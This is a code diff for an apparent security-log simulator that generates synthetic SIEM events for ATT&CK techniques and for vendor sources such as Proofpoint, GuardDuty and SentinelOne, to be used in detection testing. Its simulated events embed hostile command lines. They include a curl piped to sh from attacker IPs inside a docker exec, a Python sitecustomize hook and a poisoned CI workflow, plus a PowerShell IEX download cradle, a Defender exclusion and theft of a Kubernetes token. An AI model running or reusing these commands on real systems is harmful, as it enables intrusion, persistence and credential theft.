@@ -939,9 +939,16 @@
       build() {
         const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
         const dropper = 'C:\\Users\\Public\\invoice.exe';
-        // Malware fingerprints the host before unpacking: if it looks like an
-        // analysis VM it exits clean. The checks themselves are the detection.
+        // Malware stalls past the sandbox's analysis window first, then
+        // fingerprints the host: if it looks like an analysis VM it exits clean.
+        // The checks themselves are the detection.
         return [
+          sym(h, 4, 1, 'Process Create', {
+            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: ['CommandLine="cmd.exe /c ping -n 120 127.0.0.1 > nul"',
+              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
+            message: 'Process Create: cmd.exe /c ping -n 120 127.0.0.1 (sleep to outlast the sandbox)',
+          }),
           sym(h, 4, 1, 'Process Create', {
             image: 'C:\\Windows\\System32\\wbem\\WMIC.exe', userDomain: `CORP\\${u}`,
             sysmonFields: ['CommandLine="wmic.exe path win32_computersystem get model,manufacturer"',
@@ -953,12 +960,6 @@
             sysmonFields: ['CommandLine="reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions"',
               `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
             message: 'Process Create: reg.exe query HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions (VM artefact check)',
-          }),
-          sym(h, 4, 1, 'Process Create', {
-            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
-            sysmonFields: ['CommandLine="cmd.exe /c ping -n 120 127.0.0.1 > nul"',
-              `ParentImage="${dropper}"`, 'IntegrityLevel="Medium"'],
-            message: 'Process Create: cmd.exe /c ping -n 120 127.0.0.1 (sleep to outlast the sandbox)',
           }),
         ];
       },
@@ -1239,6 +1240,254 @@
           '/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
           '/proxy?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role',
         ].slice(0, rand.int(1, 2)).map((u) => web(h, 3, a, 'GET', u, { status: 200 }));
+      },
+    },
+
+    // ---- ATT&CK v18 (October 2025) --------------------------------------------
+    // Twelve techniques landed in Enterprise v18. These nine ride log sources
+    // the simulator already emits; the other three arrive with the SQL Server,
+    // GitHub and Docker sources, whose bursts carry them.
+    'net-fw-disable': {
+      label: 'Network Device Firewall Off', category: 'attack',
+      build() {
+        const a = rand.pick(THREAT_INTEL.ips);
+        const host = rand.pick(['core-sw-01', 'rtr-edge-02']);
+        const user = rand.pick(['netadmin', 'cisco', 'svc_backup']);
+        const base = () => ({
+          srcType: 'ciscoios', vendor: 'ciscoios', host, hostIp: '10.0.0.254',
+          facility: FACILITY.local7, program: 'IOS', severity: 5,
+          mnemonic: 'CONFIG_I', iosFacility: 'SYS', user, srcIp: a,
+        });
+        // Strip the inspection policy, then the ACL that fed it. One alert: the
+        // rule cools down per device.
+        return [
+          Object.assign(base(), { message: `Configured from console by ${user} on vty0 (${a}): no ip inspect name FW-IN` }),
+          Object.assign(base(), { severity: 4, message: `Configured from console by ${user} on vty0 (${a}): no ip access-group EDGE-IN in` }),
+          Object.assign(base(), { severity: 4, message: `Configured from console by ${user} on vty0 (${a}): no service-policy type inspect INSIDE-TO-OUTSIDE` }),
+        ];
+      },
+    },
+    'backup-recon': {
+      label: 'Backup Software Discovery', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const cmds = [
+          'powershell.exe -NoP -C "Get-Service | Where-Object {$_.Name -like \'*Veeam*\'}"',
+          'wmic.exe /namespace:\\\\root\\veeam path VeeamBackupJob get Name,LastResult',
+          'vssadmin.exe list shadows',
+          'wbadmin.exe get versions',
+        ];
+        return cmds.slice(0, rand.int(2, 4)).map((c) => win(h, 4, 4688, {
+          user: u, srcIp: h.ip,
+          message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=${c.split(' ')[0]} CommandLine="${c}"`,
+        }));
+      },
+    },
+    'edr-exclusion': {
+      label: 'EDR Exclusion Added', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const dir = `C:\\Users\\${u}\\AppData\\Local\\Temp\\stage`;
+        // The scanner keeps running and keeps reporting healthy — it has just
+        // been told not to look at the staging directory. That is T1679.
+        return [
+          win(h, 3, 4688, { user: u, srcIp: h.ip,
+            message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=powershell.exe CommandLine="powershell.exe -NoP -W Hidden -C Add-MpPreference -ExclusionPath '${dir}'"` }),
+          win(h, 3, 4688, { user: u, srcIp: h.ip,
+            message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=powershell.exe CommandLine="powershell.exe -NoP -C Add-MpPreference -ExclusionProcess 'rundll32.exe'"` }),
+          Object.assign(mde({
+            host: h.name, hostIp: h.ip, severity: 3, user: u, mdeSeverity: 'Medium',
+            alertTitle: 'Antivirus scan exclusion added',
+            threatSig: 'Antivirus scan exclusion added', threatSev: 'high',
+            threatTactic: 'Defense Evasion', threatTechnique: 'T1679 · Selective Exclusion',
+            message: `Defender for Endpoint: scan exclusion added on ${h.name} — exclusion path ${dir}`,
+          })),
+        ];
+      },
+    },
+    'container-exec': {
+      label: 'Container CLI Abuse', category: 'attack',
+      build() {
+        const id = rand.hex(64);
+        const src = rand.internalIp();
+        const base = () => ({
+          srcType: 'docker', vendor: 'docker', host: 'docker-node-02', hostIp: '10.20.1.22',
+          facility: FACILITY.local6, program: 'dockerd', proto: 'tcp',
+          containerId: id, containerName: 'billing-api', image: 'registry.corp.local/billing-api:1.14.2',
+        });
+        // No shell history, no auditd record on the host: the Engine API is the
+        // execution primitive, which is exactly what v18's T1059.013 names.
+        return [
+          Object.assign(base(), { severity: 4, dockerAction: 'exec_create', srcIp: src, user: 'root',
+            cmdLine: 'sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"',
+            message: 'docker exec_create billing-api: sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"' }),
+          Object.assign(base(), { severity: 3, dockerAction: 'exec_start', srcIp: src, user: 'root',
+            cmdLine: 'sh -c "apk add --no-cache curl && curl -s http://' + rand.pick(THREAT_INTEL.ips) + '/s.sh | sh"',
+            message: 'docker exec_start billing-api: package installed and remote script piped to sh' }),
+        ];
+      },
+    },
+    'storage-discovery': {
+      label: 'Local Storage Discovery', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const cmds = [
+          'wmic.exe logicaldisk get caption,description,providername,freespace',
+          'powershell.exe -C "Get-PSDrive -PSProvider FileSystem"',
+          'fsutil.exe fsinfo drives',
+          'net.exe use *',
+          'powershell.exe -C "Get-Volume | Sort-Object SizeRemaining"',
+        ];
+        return cmds.slice(0, rand.int(3, 5)).map((c) => win(h, 5, 4688, {
+          user: u, srcIp: h.ip,
+          message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=${c.split(' ')[0]} CommandLine="${c}"`,
+        }));
+      },
+    },
+    'python-hook': {
+      label: 'Python Startup Hook', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.ssh);
+        const relayPid = rand.int(600, 4000);
+        const serial = rand.int(1000, 9999);
+        const at = Date.now();
+        const path = '/usr/lib/python3.12/site-packages/sitecustomize.py';
+        const base = () => ({
+          srcType: 'auditd', vendor: 'auditd', host: h.name, hostIp: h.ip,
+          facility: FACILITY.user, program: 'audispd', pid: relayPid,
+          auditSerial: serial, auditTs: at,
+        });
+        // Every interpreter on the box imports sitecustomize, so the payload
+        // runs whenever anything python does — no cron, no unit, no run key.
+        return [
+          Object.assign(base(), {
+            severity: 3, auditType: 'SYSCALL', auid: 1000, uid: 0, comm: 'python3',
+            auditBody: `arch=c000003e syscall=257 success=yes exit=3 ppid=${rand.int(1000, 9999)} pid=${rand.int(10000, 30000)} auid=1000 uid=0 euid=0 comm="python3" exe="/usr/bin/python3.12" key="pyhook"`,
+            message: `SYSCALL openat success=yes ${path} comm="python3" auid=1000 uid=0 key="pyhook"`,
+          }),
+          Object.assign(base(), {
+            severity: 3, auditType: 'PATH', auid: 1000, uid: 0,
+            auditBody: `item=0 name="${path}" inode=${rand.int(100000, 999999)} dev=fd:01 mode=0100644 ouid=0 ogid=0 nametype=CREATE`,
+            message: `PATH nametype=CREATE name="${path}" — sitecustomize.py written, runs on every interpreter start`,
+          }),
+          Object.assign(base(), {
+            severity: 3, auditType: 'EXECVE', auid: 1000, uid: 0, comm: 'sh',
+            auditBody: `argc=3 a0="/bin/sh" a1="-c" a2="echo 'import os;os.system(\"curl -s http://${rand.pick(THREAT_INTEL.ips)}/i|sh\")' >> ${path}"`,
+            message: `EXECVE /bin/sh -c "echo import os;os.system(...) >> ${path}" (PYTHONSTARTUP hook)`,
+          }),
+        ];
+      },
+    },
+    'dll-sideload': {
+      label: 'Malicious Library Sideload', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const dir = `C:\\Users\\${u}\\AppData\\Local\\Temp\\update`;
+        const signed = rand.pick(['OneDriveStandaloneUpdater.exe', 'Teams.exe', 'GoogleUpdate.exe']);
+        const dll = rand.pick(['version.dll', 'dbghelp.dll', 'winhttp.dll']);
+        // The process keeps its trustworthy name and signature; the DLL beside
+        // it in a writable directory is what actually runs.
+        return [
+          sym(h, 4, 11, 'File created', {
+            image: 'C:\\Windows\\System32\\cmd.exe', userDomain: `CORP\\${u}`,
+            sysmonFields: [`TargetFilename="${dir}\\${dll}"`, `CreationUtcTime="2026-09-11 04:12:55.401"`],
+            message: `File created: ${dir}\\${dll}`,
+          }),
+          sym(h, 3, 7, 'Image loaded', {
+            image: `${dir}\\${signed}`, userDomain: `CORP\\${u}`,
+            sysmonFields: [`Image="${dir}\\${signed}"`, `ImageLoaded="${dir}\\${dll}"`,
+              'Signed="false"', 'SignatureStatus="Unavailable"', `Hashes="SHA256=${rand.hex(64)}"`],
+            message: `Image loaded: ${signed} loaded ${dir}\\${dll} Signed=false SignatureStatus=Unavailable`,
+          }),
+        ];
+      },
+    },
+    'ua-spoof': {
+      label: 'Browser Fingerprint Spoof', category: 'attack',
+      build() {
+        const victim = rand.internalIp();
+        const c2 = rand.pick(THREAT_INTEL.ips);
+        // The User-Agent says Chrome. The TLS handshake is Cobalt Strike's
+        // default profile, which no browser produces — v18's T1036.012.
+        const ja3 = 'a0e9f5d64349fb13191bc781f81f42e1';
+        const ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
+        return [1, 2].map((i) => ({
+          srcType: 'zeek', vendor: 'zeek', host: 'zeek-sensor-01', hostIp: '10.0.0.11',
+          facility: FACILITY.local6, program: 'zeek', severity: 4, proto: 'tcp',
+          zeekLog: 'ssl', srcIp: victim, dstIp: c2, srcPort: 49000 + i, dstPort: 443,
+          userAgent: ua, tlsClient: 'CobaltStrike/default-profile', ja3, ja3Mismatch: true,
+          zeekFields: [victim, String(49000 + i), c2, '443', 'TLSv12',
+            'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384', rand.pick(THREAT_INTEL.domains), 'T', ja3,
+            'ae4edc6faf64d08308082ad26be60767'],
+          message: `ssl ${victim} -> ${c2}:443 TLSv12 ja3=${ja3} user_agent="${ua}" (JA3 does not match the advertised browser)`,
+        }));
+      },
+    },
+    'delay-exec': {
+      label: 'Delayed Execution', category: 'attack',
+      build() {
+        const h = rand.pick(HOSTS.windows), u = rand.pick(USERS);
+        const a = rand.pick(THREAT_INTEL.ips);
+        const wait = rand.pick([600, 900, 1800]);
+        // Sleep past the sandbox's analysis window, then run. The stall and the
+        // payload are one command line, which is what makes it the technique
+        // rather than a script being polite.
+        return [
+          win(h, 4, 4688, { user: u, srcIp: h.ip,
+            message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=powershell.exe ` +
+              `CommandLine="powershell.exe -NoP -W Hidden -C Start-Sleep -Seconds ${wait}; IEX (New-Object Net.WebClient).DownloadString('http://${a}/s.ps1')"` }),
+          win(h, 4, 4688, { user: u, srcIp: h.ip,
+            message: `EventID=4688 A new process has been created. Account=${u} NewProcessName=cmd.exe ` +
+              `CommandLine="cmd.exe /c timeout /t ${wait} && rundll32.exe C:\\Users\\${u}\\AppData\\Local\\Temp\\u.dll,Start"` }),
+        ];
+      },
+    },
+    'db-mass-read': {
+      label: 'Database Mass Extraction', category: 'attack',
+      build() {
+        const who = rand.pick(['CORP\\contractor', 'CORP\\jdoe', 'CORP\\svc_report']);
+        const client = rand.internalIp();
+        const app = rand.pick(['Microsoft SQL Server Management Studio', 'bcp.exe']);
+        const base = () => ({
+          srcType: 'mssql', vendor: 'mssql', host: 'WIN-SQL01', hostIp: '10.10.2.31',
+          facility: FACILITY.local5, program: 'MSSQLSERVER', severity: 4, proto: 'tcp',
+          dbName: 'CRM_PROD', schemaName: 'dbo', classType: 'U ', actionId: 'SL',
+          user: who, srcIp: client, appName: app, clientHost: 'WIN-FS02',
+        });
+        // v18 gave databases their own cell under Data from Information
+        // Repositories: whole tables, read by a person, through a client tool.
+        return ['Customers', 'CreditCards', 'Employees', 'Salaries', 'ApiKeys'].slice(0, rand.int(3, 5)).map((tbl) =>
+          Object.assign(base(), {
+            objectName: tbl, rows: rand.int(120000, 900000),
+            statement: `SELECT * FROM dbo.${tbl}`,
+            message: `MSSQL SELECT * FROM dbo.${tbl} by ${who.replace('CORP\\', '')} via ${app}`,
+          }));
+      },
+    },
+    'pipeline-poison': {
+      label: 'Poisoned Pipeline Execution', category: 'attack',
+      build() {
+        const org = 'corp-eng';
+        const repo = `${org}/${rand.pick(['payments-api', 'platform-infra'])}`;
+        const a = rand.pick(THREAT_INTEL.ips);
+        const base = () => ({
+          srcType: 'github', vendor: 'github', host: 'github-connector-01',
+          facility: FACILITY.local6, program: 'github_audit', proto: 'tcp',
+          org, repo, eventUuid: rand.uuid(), actorId: String(rand.int(1000000, 9999999)),
+          user: 'contractor-ci', srcIp: a, branch: 'main',
+          workflowName: '.github/workflows/release.yml', userAgent: 'GitHub-Hookshot/f1a2b3c',
+        });
+        // The edit alone is a change. The edit, then a run on a self-hosted
+        // runner that holds the production secrets, is T1677.
+        return [
+          Object.assign(base(), { severity: 4, ghAction: 'workflows.updated_workflow_file',
+            workflowId: String(rand.int(10000000, 99999999)), operationType: 'modify',
+            message: `GitHub: release.yml modified on main of ${repo} — step added: curl -s http://${a}/b.sh | bash` }),
+          Object.assign(base(), { severity: 2, ghAction: 'workflows.completed_workflow_run',
+            workflowRunId: String(rand.int(10000000000, 99999999999)),
+            runnerGroup: 'self-hosted-prod', runnerName: 'runner-prod-03',
+            message: `GitHub: release.yml ran on self-hosted runner runner-prod-03 in ${repo} and read 6 repository secrets` }),
+        ];
       },
     },
   };
@@ -3108,6 +3357,543 @@
         return evs;
       },
     },
+    proofpoint: {
+      // Proofpoint does not speak syslog: the SIEM API is polled for message
+      // and click events, so a connector re-emits them — transport 'api'.
+      label: 'Proofpoint Email', category: 'appliance', transport: 'api',
+      build() {
+        const base = () => ({
+          srcType: 'proofpoint', vendor: 'proofpoint', host: 'pps-connector-01',
+          facility: FACILITY.local6, program: 'pps_siem', severity: 6, proto: 'tcp',
+          eventUuid: rand.uuid(), qid: `${rand.hex(6)}${rand.int(100000, 999999)}`,
+          messageId: `<${rand.uuid()}@mail.example.net>`, spamScore: rand.int(0, 20),
+          phishScore: 0, malwareScore: 0, impostorScore: 0,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const who = rand.pick(USERS);
+          evs.push(Object.assign(base(), {
+            sender: `${rand.pick(['news', 'billing', 'noreply'])}@${rand.pick(['partner.io', 'vendor.example', 'saas.example'])}`,
+            headerFrom: 'noreply@partner.io', recipient: `${who}@corp.local`, user: who,
+            srcIp: rand.ip(), subject: rand.pick(['Your invoice is ready', 'Weekly report', 'Meeting notes']),
+            message: 'Message delivered — clean',
+          }));
+        }
+        // Credential phish: the scores are the verdict, and the quarantine rule
+        // names it. Proofpoint has already decided, so the event carries the cell.
+        const victim = rand.pick(USERS);
+        const badIp = rand.pick(THREAT_INTEL.ips);
+        const lure = rand.pick([
+          ['Action required: your mailbox will be deactivated', 'Credential Phishing'],
+          ['Payroll update — confirm your bank details', 'Business Email Compromise'],
+          ['Shared document: Q3_Forecast.xlsx', 'Credential Phishing'],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 3, sender: `it-support@corp-local.${rand.pick(['co', 'net', 'help'])}`,
+          headerFrom: 'it-support@corp.local', recipient: `${victim}@corp.local`, user: victim,
+          srcIp: badIp, subject: lure[0], phishScore: rand.int(88, 100), spamScore: rand.int(60, 90),
+          impostorScore: rand.int(70, 100),
+          quarantineFolder: 'Phish', quarantineRule: 'threat_phish',
+          threats: [{ threatType: 'url', threatStatus: 'active', classification: 'phish',
+            threat: `https://corp-local.${rand.pick(['co', 'net'])}/sso/verify` }],
+          threatSig: lure[1], threatSev: 'high',
+          threatTactic: 'Initial Access', threatTechnique: 'T1566.002 · Spearphishing Link',
+          message: `PPS quarantined ${lure[1].toLowerCase()} to ${victim}@corp.local from ${badIp} — "${lure[0]}"`,
+        }));
+        return evs;
+      },
+    },
+    sentinelone: {
+      // Threats are read from /web/api/v2.1/threats by a connector — 'api'.
+      label: 'SentinelOne', category: 'appliance', transport: 'api',
+      build() {
+        const h = rand.pick(HOSTS.windows);
+        const base = () => ({
+          srcType: 'sentinelone', vendor: 'sentinelone', host: h.name, hostIp: h.ip,
+          facility: FACILITY.local5, program: 's1_threats', severity: 4, proto: 'tcp',
+          threatIdS1: String(rand.int(1000000000000000, 9000000000000000)),
+          storyline: rand.hex(16).toUpperCase(), sha1: rand.hex(40), sha256: rand.hex(64),
+          s1Confidence: 'malicious', s1Verdict: 'true_positive', s1Mitigation: 'mitigated',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            severity: 6, s1Class: 'PUA', s1Confidence: 'suspicious', s1Verdict: 'undefined',
+            s1Mitigation: 'not_mitigated', fileName: rand.pick(['OptimizerPro.exe', 'DriverBooster.exe']),
+            filePath: 'C:\\Users\\Public\\Downloads\\setup.exe',
+            message: 'SentinelOne: potentially unwanted application quarantined',
+          }));
+        }
+        const threat = rand.pick([
+          ['Ransomware', 'lockbit3.exe', 'T1486 · Data Encrypted for Impact', 'Impact', 'critical'],
+          ['Malware', 'mimikatz.exe', 'T1003.001 · LSASS Memory', 'Credential Access', 'critical'],
+          ['Infostealer', 'redline_stealer.exe', 'T1555 · Credentials from Password Stores', 'Credential Access', 'high'],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 2, s1Class: threat[0], fileName: threat[1],
+          filePath: `C:\\Users\\${rand.pick(USERS)}\\AppData\\Local\\Temp\\${threat[1]}`,
+          cmdLine: `"${threat[1]}" --silent`, user: rand.pick(USERS),
+          s1Indicators: [['Evasion', 'Deleted Volume Shadow Copies', ['Defense Evasion']],
+            ['Injection', 'Wrote to the memory of another process', ['Privilege Escalation']]],
+          threatSig: `${threat[0]}: ${threat[1]}`, threatSev: threat[4],
+          threatTactic: threat[3], threatTechnique: threat[2],
+          message: `SentinelOne ${threat[0].toLowerCase()} detection on ${h.name}: ${threat[1]} (mitigated)`,
+        }));
+        return evs;
+      },
+    },
+    guardduty: {
+      // Findings leave AWS through EventBridge or an S3 export — 'api'.
+      label: 'AWS GuardDuty', category: 'appliance', transport: 'api',
+      build() {
+        const base = () => ({
+          srcType: 'guardduty', vendor: 'guardduty', host: 'aws-connector-01',
+          facility: FACILITY.local6, program: 'aws_guardduty', severity: 4, proto: 'tcp',
+          accountId: AWS_ACCOUNT, region: 'us-east-1', detectorId: rand.hex(32),
+          findingId: rand.hex(32), resourceType: 'Instance',
+        });
+        const evs = [];
+        const inst = `i-0${rand.hex(16)}`;
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            severity: 5, gdSeverity: 2, findingType: 'Recon:EC2/PortProbeUnprotectedPort',
+            title: 'Unprotected port on EC2 instance is being probed.',
+            instanceId: inst, gdActionType: 'PORT_PROBE', dstIp: rand.ip(), dstPort: rand.pick([22, 3389]),
+            country: 'Netherlands',
+            message: `GuardDuty: unprotected port probed on ${inst}`,
+          }));
+        }
+        const f = rand.pick([
+          ['CryptoCurrency:EC2/BitcoinTool.B!DNS', 8.0, 'EC2 instance is querying a domain associated with cryptocurrency mining',
+            'T1496 · Resource Hijacking', 'Impact', 'critical'],
+          ['Backdoor:EC2/C&CActivity.B!DNS', 8.5, 'EC2 instance is querying a domain associated with a known command and control server',
+            'T1071.004 · DNS', 'Command and Control', 'critical'],
+          ['UnauthorizedAccess:IAMUser/MaliciousIPCaller.Custom', 7.0, 'An API was invoked from an IP address on a custom threat list',
+            'T1078.004 · Cloud Accounts', 'Initial Access', 'high'],
+          ['Exfiltration:S3/ObjectRead.Unusual', 7.5, 'An IAM principal invoked an unusual API to read S3 objects',
+            'T1530 · Data from Cloud Storage', 'Exfiltration', 'high'],
+        ]);
+        const iam = /IAMUser|S3/.test(f[0]);
+        evs.push(Object.assign(base(), {
+          severity: 2, gdSeverity: f[1], findingType: f[0], title: f[2],
+          gdCount: rand.int(3, 40), threatList: 'corp-custom-threatlist',
+          resourceType: iam ? 'AccessKey' : 'Instance',
+          instanceId: iam ? undefined : inst,
+          accessKeyId: iam ? `AKIA${rand.hex(16).toUpperCase()}` : undefined,
+          principalId: iam ? `AIDA${rand.hex(17).toUpperCase()}` : undefined,
+          user: iam ? rand.pick(['svc_deploy', 'analytics-ro']) : undefined,
+          gdActionType: iam ? 'AWS_API_CALL' : 'DNS_REQUEST',
+          dstIp: iam ? undefined : rand.pick(THREAT_INTEL.ips), dstPort: iam ? undefined : 53,
+          country: 'Russia', srcIp: iam ? rand.pick(THREAT_INTEL.ips) : undefined,
+          threatSig: f[0], threatSev: f[5], threatTactic: f[4], threatTechnique: f[3],
+          message: `GuardDuty [${f[1]}] ${f[0]}: ${f[2]}`,
+        }));
+        return evs;
+      },
+    },
+    vpcflow: {
+      // Flow logs land in CloudWatch Logs or S3 and are pulled from there — 'api'.
+      label: 'AWS VPC Flow Logs', category: 'appliance', transport: 'api',
+      build() {
+        const eni = `eni-0${rand.hex(16)}`;
+        const workload = rand.internalIp();
+        const base = () => ({
+          srcType: 'vpcflow', vendor: 'vpcflow', host: 'aws-connector-01',
+          facility: FACILITY.local6, program: 'vpc_flow', severity: 6,
+          accountId: AWS_ACCOUNT, eniId: eni, protoNum: 6, proto: 'tcp', windowSecs: 60,
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 5); i < n; i++) {
+          const bytes = rand.int(400, 90000);
+          evs.push(Object.assign(base(), {
+            srcIp: workload, dstIp: rand.ip(), srcPort: rand.int(32768, 60999),
+            dstPort: rand.pick([443, 443, 80, 5432]), packets: rand.int(4, 400), bytes, action: 'ACCEPT',
+            message: `VPC flow ACCEPT ${workload} -> ${rand.ip()} ${bytes}B`,
+          }));
+        }
+        // A rejected sweep across the subnet: no signature, so the port-scan rule
+        // counts the distinct destination ports and raises one alert.
+        const scanner = rand.pick(THREAT_INTEL.ips);
+        const PORTS = [21, 22, 23, 25, 53, 110, 135, 139, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 11211, 27017];
+        PORTS.slice(0, rand.int(17, 20)).forEach((port) => {
+          evs.push(Object.assign(base(), {
+            severity: 4, srcIp: scanner, dstIp: workload, srcPort: rand.int(32768, 60999),
+            dstPort: port, packets: 1, bytes: 40, action: 'REJECT',
+            message: `VPC flow REJECT ${scanner} -> ${workload}:${port}`,
+          }));
+        });
+        return evs;
+      },
+    },
+    gcp: {
+      // Cloud Audit Logs are exported through a Pub/Sub sink — 'api'.
+      label: 'Google Cloud audit', category: 'appliance', transport: 'api',
+      build() {
+        const project = 'corp-prod-4417';
+        const base = () => ({
+          srcType: 'gcp', vendor: 'gcp', host: 'gcp-connector-01', facility: FACILITY.local6,
+          program: 'gcp_audit', severity: 5, proto: 'tcp', project, eventUuid: rand.id() + rand.id(),
+          location: 'us-central1', userAgent: rand.pick(['google-cloud-sdk gcloud/478.0.0', 'Terraform/1.8.4']),
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          evs.push(Object.assign(base(), {
+            severity: 6, gcpSeverity: 'NOTICE', resourceType: 'gce_instance',
+            serviceName: 'compute.googleapis.com', methodName: 'v1.compute.instances.list',
+            resourceName: `projects/${project}/zones/us-central1-a/instances`,
+            permission: 'compute.instances.list', user: 'svc-deploy@corp-prod-4417.iam.gserviceaccount.com',
+            srcIp: rand.internalIp(), message: 'GCP compute.instances.list',
+          }));
+        }
+        const abuse = rand.pick([
+          ['SetIamPolicy', 'cloudresourcemanager.googleapis.com', 'resourcemanager.projects.setIamPolicy',
+            'roles/owner granted to attacker@gmail.com at project scope',
+            'T1098.003 · Additional Cloud Roles', 'Privilege Escalation', 'critical'],
+          ['google.iam.admin.v1.CreateServiceAccountKey', 'iam.googleapis.com', 'iam.serviceAccountKeys.create',
+            'new user-managed key minted for svc-deploy',
+            'T1098.001 · Additional Cloud Credentials', 'Persistence', 'high'],
+          ['google.logging.v2.ConfigServiceV2.DeleteSink', 'logging.googleapis.com', 'logging.sinks.delete',
+            'audit export sink "siem-sink" deleted',
+            'T1562.008 · Disable or Modify Cloud Logs', 'Defense Evasion', 'critical'],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 2, gcpSeverity: 'NOTICE', resourceType: 'project',
+          serviceName: abuse[1], methodName: abuse[0], permission: abuse[2],
+          resourceName: `projects/${project}`, user: rand.pick(['svc-deploy@corp-prod-4417.iam.gserviceaccount.com', 'contractor@gmail.com']),
+          srcIp: rand.pick(THREAT_INTEL.ips), userAgent: 'google-cloud-sdk gcloud/478.0.0',
+          threatSig: abuse[0], threatSev: abuse[6], threatTactic: abuse[5], threatTechnique: abuse[4],
+          message: `GCP ${abuse[0]} on ${project}: ${abuse[3]}`,
+        }));
+        return evs;
+      },
+    },
+    gworkspace: {
+      // Reports API activities.list, polled by a connector — 'api'.
+      label: 'Google Workspace', category: 'appliance', transport: 'api',
+      build() {
+        const customerId = 'C03k8xq1p';
+        const base = () => ({
+          srcType: 'gworkspace', vendor: 'gworkspace', host: 'gws-connector-01',
+          facility: FACILITY.local6, program: 'gws_reports', severity: 6, proto: 'tcp',
+          customerId, qid: String(rand.int(1000000000000, 9999999999999)), actorId: String(rand.int(100000000000000000, 999999999999999999)),
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(2, 3); i < n; i++) {
+          const who = `${rand.pick(USERS)}@corp.local`;
+          evs.push(Object.assign(base(), {
+            gwApp: 'login', gwType: 'login', gwName: 'login_success', user: who, srcIp: rand.ip(),
+            gwParams: [['login_type', 'saml'], ['is_suspicious', false]],
+            message: `Workspace login_success ${who}`,
+          }));
+        }
+        const abuse = rand.pick([
+          ['admin', 'DELEGATED_ADMIN_SETTINGS', 'ASSIGN_ROLE', [['ROLE_NAME', 'Super Admin'], ['USER_EMAIL', 'contractor@corp.local']],
+            'Super Admin role assigned to contractor@corp.local', 'T1098.003 · Additional Cloud Roles', 'Privilege Escalation', 'critical'],
+          ['drive', 'acl_change', 'change_document_visibility', [['visibility', 'people_within_domain_with_link'], ['doc_title', 'Customer_Master_List']],
+            'Customer_Master_List shared by link outside the domain', 'T1567 · Exfiltration Over Web Service', 'Exfiltration', 'high'],
+          ['login', 'login', 'login_failure', [['login_type', 'unknown'], ['is_suspicious', true]],
+            'suspicious login blocked', 'T1110 · Brute Force', 'Credential Access', 'high'],
+        ]);
+        evs.push(Object.assign(base(), {
+          severity: 3, gwApp: abuse[0], gwType: abuse[1], gwName: abuse[2], gwParams: abuse[3],
+          user: `${rand.pick(['admin', 'jdoe'])}@corp.local`, srcIp: rand.pick(THREAT_INTEL.ips),
+          threatSig: abuse[2], threatSev: abuse[7], threatTactic: abuse[6], threatTechnique: abuse[5],
+          message: `Workspace ${abuse[2]}: ${abuse[4]}`,
+        }));
+        return evs;
+      },
+    },
+    netskope: {
+      // Netskope events are pulled from the REST API v2 — 'api'.
+      label: 'Netskope SWG', category: 'appliance', transport: 'api',
+      build() {
+        const base = () => ({
+          srcType: 'netskope', vendor: 'netskope', host: 'netskope-connector-01',
+          facility: FACILITY.local6, program: 'netskope_events', severity: 6, proto: 'tcp',
+          country: 'AU', policy: 'corp-default',
+        });
+        const evs = [];
+        for (let i = 0, n = rand.int(3, 4); i < n; i++) {
+          const app = rand.pick([['Microsoft OneDrive', 'Cloud Storage', 'excellent'], ['Salesforce', 'CRM', 'excellent'], ['Slack', 'Collaboration', 'high']]);
+          evs.push(Object.assign(base(), {
+            nsType: 'nspolicy', alertType: null, user: `${rand.pick(USERS)}@corp.local`,
+            srcIp: rand.internalIp(), dstIp: rand.ip(), app: app[0], appCategory: app[1], ccl: app[2],
+            activity: rand.pick(['Login', 'Download', 'View']), action: 'allow',
+            url: `${app[0].toLowerCase().replace(/ /g, '')}.com/home`, site: `${app[0]}`,
+            message: `Netskope allow ${app[0]} ${rand.pick(['Login', 'Download'])}`,
+          }));
+        }
+        // Upload of a DLP-matched file to an unsanctioned personal cloud app.
+        const who = `${rand.pick(USERS)}@corp.local`;
+        const bytes = rand.int(40000000, 900000000);
+        evs.push(Object.assign(base(), {
+          severity: 2, nsType: 'nspolicy', alertType: 'DLP', user: who,
+          srcIp: rand.internalIp(), dstIp: rand.ip(),
+          app: rand.pick(['MEGA', 'Dropbox Personal', 'Google Drive Personal']), appCategory: 'Cloud Storage',
